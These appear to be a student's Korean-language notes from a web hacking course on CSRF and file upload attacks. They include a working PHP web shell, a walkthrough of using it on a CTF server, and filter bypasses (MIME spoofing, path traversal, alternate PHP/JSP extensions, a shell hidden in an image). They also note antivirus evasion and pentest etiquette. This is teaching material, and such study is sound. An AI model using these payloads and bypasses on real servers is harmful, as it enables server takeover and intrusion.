* CSRF
정의
>피해자가 서버로 공격자가 원하는 요청을 보내게 만드는 공격

공격 시나리오
GET - Link
POST - xss
토큰 정보까지 필요할 경우 - iframe

대응 방안
> 인증 정보를 추가하는 것.
> 레퍼러 검증


* File Upload

* 정의
> 공격자가 원하는 임의의 파일을 업로드.

* 발생 원인
> 파일을 업로드 받을 때!
> 검증, 검사를 안한다.

프로필 사진.
-> 이미지 파일

* 발생 위치
> 파일을 업로드할 수 있는 곳.

은행앱
> 파일 업로드라고 볼 수 있음. 신분증 검사

-burp suite
_____________
-- File Upload 공격으로 뭘 할 수 있는데?!
* 공격 시나리오
Unlimited

(수업에서 나온 내용)
- DoS (서비스 거부) 공격
- 웹 쉘
- 악성 코드 업로드
- 백도어
- 악성프로그램 설치파일

* 공격 시나리오
Unlimited

1. 서버 측 실행 파일(각 백엔드 언어에 맞는 파일을 올려야지 엔진이 작동함)
> 서버에서 우리가 원하는 코드를 실행할 수 있다.
=> 우리가 서버에게 원하는 명령을 내릴 수 있다.
=> 그 서버는 내꺼다.

windows =-> exe

> test.php
<?php
  woeijfaoidf
  woeifjsadof
?>

normaltic.com/test.php
웹 서버가 실행을 하고 그 결과를 전달함
우리가 작성한 내용들이 웹 서버에서 실행됨

_____________

* Server Side Script vs Client Side Script
백엔드(서버에서 실행하는 코드) vs 프론트엔드(브라우저에서 실행하는 코드)

> 웹 브라우저에서 실행(html, css, javascript)
> php, asp, jsp, python, nodejs ...

test.php
<?php
  echo "hello";
?>
서버에서 다 실행하고 hello 라는 문자를 보내줌

네이버 웹 서버에 업로드 한다면,
naver.com/test.php
<?php
  정말 나쁜 코드
  이건 진짜 심각한 코드
?>


2. Phising : HTML 파일
login.php

naver.com/login.php 이와 같이 피싱

3. Deface 공격
> index 파일 (덮어쓰기.) - 핵티비즘 공격에서 자주 일어남

4. XSS
> Stored XSS
메인페이지.
<script>
  sodifjiowejf
  weoijfawoejf
</script>

5. DoS
대용량의 파일을 마구 쏟아냄

_____________

- 서버 측 실행 파일
: Web Shell

php web shell

<?php
  echo system($_GET['cmd']);
?>
cmd 창에 cmd를 입력받는 느낌

웹 해킹 ----- + 부록
--- ---
> shell.
> root 권한

_____________

* 웹쉘 공격의 핵심
1. 웹 서버 측 실행 코드(php, python 등)를 업로드
2. 업로드된 파일의 경로 - 이게 은근 어려움

* 경로 확인
- 업로드한 파일이 출력되는 곳을 확인한다!

"""
이미지를 업로드 하고
이미지가 나타난 곳에서 이미지 주소복사
"""

업로드한 파일의 경로를 알아내는 이유.
경로 알기 -> 요청 -> 실행.

<정리>
php 코드로 작성한 다음, 웹 서버로 올림
이제 요청을 하면 서버에서 실행이 됨

다른 사람 컴퓨터는 공격 못하고
서버만 공격.(서버 측 실행 파일)
_____________

XSS, CSRF : Client 공격.
SQL Injection, Web Shell : 웹 서버 공격

_____________

jsp
- java
와 같이 서버에서 실행할 수 있는 파일을 올리는 것임
서버측 언어.

파일 업로드 공격 = (흔히) 웹 쉘 공격

http://ctf.segfaulthub.com:9992/main.php

웹쉘을 올리고, id 명령어 실행한 결과
캡쳐 사진으로 디코 dm으로 보내기(성공!)

<풀이>
<?php
  echo system($_GET['cmd']);
?>
url 경로 복사하여 띄워보기
file=webshell.php&
target_Dir=./file/uploads 뒷부분 따서 앞 부분 지우고 적기
요청헤더의 php에 ?붙이고 cmd=id 적고 요청

(부록)
파일 다운로드 경로는 download.php 경로를 기준으로 들어감
download.php?file=webshell.php&target_dir=./file/upload

_____________

* 백신
>> 합법적인 악성코드.

astx -> 종료가 안된다.(ahnlab safe transaction)
-> burp를 꺼버림
e2e가 적용된 경우, 부수면 취약점이 상당히 많이 있을 수 있음

-->
웹 브라우저 검사 : 크롬, ie, safari
네이버 웨일 웹브라우저로 우회했다(경험)
_____________

리버싱은 필수.
(백신은 우리의 적이다!)

(잠깐 QNA)
php asp jsp는 어떻게 알 수 있을까?
보통 도메인에 .php 등과 같이 나옴

_____________

* 파일 업로드 약한 대응?

> 업로드 되는 파일을 검사하자! 제한!

1. MIME 타입
Content-Type: text/php

그러나 우회할 수 있음.
파일 업로드 할 때, burp로 Content-Type을 바꾸어 보기

2. 실행 X
파일 경로를 타고 들어가보면, 서버에서 코드가 실행되지 않고 나오기만 함

/files/avatars/ ~~~
디렉토리에 있는 파일들은 실행권한을 없앰

우회 방법 : 파일 이름에 ./가 아니라 ../를 입력하여 상위 폴더에 저장하도록 함
(슬래시 입력할 때 url 인코딩 해야함 / -> %2f)

3. php 확장자
php 확장자를 필터링 함
우회 방법 : PhP, pHp, pHP 로 우회

대소문자 모두 필터링할 경우?
우회방법 : .pthml, .php3, .php5 와 같은 자매품으로 우회

* jsp
우회방법 : jspx, jsw

=> 다른 확장자를 쓸 수도 있다!

_____________

그러면 어떻게 파일 업로드를 검사할까..?

* 정상적인 이미지.
normaltic.png 을 하나 받고
-> hex editor로 파일을 열기
중간이나 끝에다가
<?php system($_GET['cmd']); ?> 문장 추가
그리고 확장자를 normaltic.php로 바꿈

File Signature를 사용할 수 있음.
jpeg, png, pdf ...

정상적인 이미지 파일을 쓰고 File Signature를 사용
이 파일 자체는 이미지 파일 구조랑 똑같이 보일 수 있음

**

서버 측 실행 코드 업로드.
-> 서버에서 실행하기 위해서.
-> 서버에서 실행할 수 있도록 업로드.

webshell.png -> 실행 안됨
webshell.php -> 이와 같이 올려야됨

(아래 두개는 다음주. 다른 기법이기 때문)
그림 웹쉘
그림 파일 웹쉘.
-> 이게 왜 파일 업로드와는 다른 공격인지 연구해볼 것(다음주에 알려줌)
_____________

* 파일 업로드 취약점을 찾을 때 주의할 점.
> 모의해킹 할 때 주의할 점.

- 웹쉘 올리면 안됨.
> 노매너.

테스트할 때, 웹쉘을 올리는 이유.
> 업로드한 파일을 실행할 수 있는지 체크.

xss : alert(1);
Proof Of Concept : 증명용

<?php
  echo "hello";
?>
지금 서버측에서 실행할 수 있는 스크립트를 업로드할 수 있고 이를 실행할 수 있었다고 증명

-> 협의.
> 웹쉘을 올려서 또 다른 취약점을 찾아도 될까요? 라고 담당자에게 묻기
허락되면 찾을 수 없었던 SQL Injection같은 것도 찾을 수 있다.

--> 웹쉘 테스트 후, 바로 삭제.

삭제 요청.
-> 체크.

14주차 과제
1. 웹 서버 개발 제출.
2. 웹쉘 2개 CTF 문제 풀기
3. 개인 웹 서버 : 웹쉘 업로드
 + Reverse shell 연결해보기.